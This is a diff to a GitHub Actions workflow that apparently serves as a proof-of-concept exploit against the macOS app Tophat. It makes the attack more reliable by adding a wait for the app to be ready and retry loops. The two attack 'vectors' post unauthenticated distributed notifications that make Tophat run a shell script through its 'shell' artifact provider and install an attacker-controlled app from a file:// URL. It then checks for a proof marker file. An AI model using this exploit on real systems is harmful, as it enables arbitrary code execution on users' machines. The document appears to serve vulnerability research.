@@ -131,19 +131,24 @@ jobs:
           # uninstall so the IPC-driven install proves it re-installs via Tophat
           xcrun simctl uninstall "$SIM_UDID" com.attacker.tophat.poc || true
 
-      - name: Launch Tophat.app in background
+      - name: Launch Tophat.app in background and wait for InstallCoordinator to idle
         run: |
           set -eux
-          open -g "$APP" || open "$APP"
-          sleep 20
-          if pgrep -x Tophat > /dev/null; then
-            echo "TOPHAT_PID=$(pgrep -x Tophat)"
-            ps -o pid,command -p $(pgrep -x Tophat) | head -3
-          else
-            echo "tophat process not visible; retrying"
-            open -a "$APP" || true
+          open "$APP"
+          # Wait aggressively for Tophat init to fully drain (device enum, InstallCoordinator, SwiftData)
+          for i in $(seq 1 24); do
+            if pgrep -x Tophat > /dev/null; then
+              echo "[wait $i] tophat pid=$(pgrep -x Tophat)"
+              # look for InstallCoordinator ready marker in unified log
+              if log show --predicate 'process == "Tophat"' --last 3m 2>/dev/null | grep -q "InstallCoordinator"; then
+                echo "[wait $i] InstallCoordinator observed, waiting 15s more for full readiness"
+                sleep 15
+                break
+              fi
+            fi
             sleep 5
-          fi
+          done
+          ps -o pid,command -p $(pgrep -x Tophat) | head -3 || true
 
       - name: Start Tophat unified log stream in background
         run: |
@@ -152,52 +157,62 @@ jobs:
           echo "LOG_STREAM_PID=$!" >> $GITHUB_ENV
           sleep 2
 
-      - name: Vector 1 - post InstallFromRecipesRequest with shell provider
+      - name: Vector 1 - post InstallFromRecipesRequest with shell provider (retry loop)
         run: |
           set -eux
           cat > post_shell.swift <<'SWIFT'
           import Foundation
-          let uuid = UUID().uuidString
-          let userInfo: [String: Any] = [
-              "id": uuid,
-              "recipes": [[
-                  "artifactProviderID": "shell",
-                  "artifactProviderParameters": ["script": "x.sh"],
-                  "launchArguments": [],
-                  "platformHint": "iOS"
-              ]]
-          ]
-          DistributedNotificationCenter.default().postNotificationName(
-              Notification.Name("Tophat.InstallFromRecipesRequest"),
-              object: nil,
-              userInfo: userInfo,
-              deliverImmediately: true
-          )
-          print("[vector1] posted Tophat.InstallFromRecipesRequest id=\(uuid)")
-          Thread.sleep(forTimeInterval: 15)
+          // Post 5 times over ~30s to overcome any receiver-not-ready timing window
+          for i in 0..<5 {
+              let uuid = UUID().uuidString
+              let userInfo: [String: Any] = [
+                  "id": uuid,
+                  "recipes": [[
+                      "artifactProviderID": "shell",
+                      "artifactProviderParameters": ["script": "x.sh"],
+                      "launchArguments": [],
+                      "platformHint": "iOS"
+                  ]]
+              ]
+              DistributedNotificationCenter.default().postNotificationName(
+                  Notification.Name("Tophat.InstallFromRecipesRequest"),
+                  object: nil,
+                  userInfo: userInfo,
+                  deliverImmediately: true
+              )
+              print("[vector1 iter=\(i)] posted id=\(uuid)")
+              Thread.sleep(forTimeInterval: 6)
+              if FileManager.default.fileExists(atPath: "/tmp/tophat_shell_proof.txt") {
+                  print("[vector1] marker present after iter=\(i)")
+                  break
+              }
+          }
+          Thread.sleep(forTimeInterval: 5)
           SWIFT
           swift post_shell.swift
 
-      - name: Vector 2 - post InstallFromURLRequest with file:// URL for the .app
+      - name: Vector 2 - post InstallFromURLRequest with file:// URL (retry loop)
         continue-on-error: true
         run: |
           set -eux
           cat > post_url.swift <<'SWIFT'
           import Foundation
-          let uuid = UUID().uuidString
-          let userInfo: [String: Any] = [
-              "id": uuid,
-              "url": "file:///tmp/Attacker.app",
-              "launchArguments": []
-          ]
-          DistributedNotificationCenter.default().postNotificationName(
-              Notification.Name("Tophat.InstallFromURLRequest"),
-              object: nil,
-              userInfo: userInfo,
-              deliverImmediately: true
-          )
-          print("[vector2] posted Tophat.InstallFromURLRequest id=\(uuid) url=file:///tmp/Attacker.app")
-          Thread.sleep(forTimeInterval: 30)
+          for i in 0..<3 {
+              let uuid = UUID().uuidString
+              let userInfo: [String: Any] = [
+                  "id": uuid,
+                  "url": "file:///tmp/Attacker.app",
+                  "launchArguments": []
+              ]
+              DistributedNotificationCenter.default().postNotificationName(
+                  Notification.Name("Tophat.InstallFromURLRequest"),
+                  object: nil,
+                  userInfo: userInfo,
+                  deliverImmediately: true
+              )
+              print("[vector2 iter=\(i)] posted id=\(uuid) url=file:///tmp/Attacker.app")
+              Thread.sleep(forTimeInterval: 15)
+          }
           SWIFT
           swift post_url.swift
 
